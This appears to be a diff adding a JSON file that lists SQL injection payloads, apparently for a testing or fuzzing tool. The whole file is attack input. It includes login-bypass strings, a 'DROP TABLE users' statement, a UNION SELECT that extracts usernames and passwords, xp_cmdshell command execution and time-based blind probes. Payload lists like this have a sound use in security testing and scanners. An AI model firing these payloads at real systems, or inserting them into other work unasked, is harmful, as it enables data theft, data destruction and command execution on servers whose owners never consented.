@@ -1,0 +1,14 @@
+{
+  "payloads": [
+    "' OR '1'='1",
+    "'; DROP TABLE users; --",
+    "' OR 1=1 --",
+    "' UNION SELECT NULL, NULL, NULL --",
+    "' AND 1=0 UNION SELECT username, password FROM users --",
+    "' OR EXISTS(SELECT * FROM users) --",
+    "' OR '' = '",
+    "'; EXEC xp_cmdshell('dir'); --",
+    "' AND sleep(5) --",
+    "' OR benchmark(1000000, SHA1('test')) --"
+  ]
+}
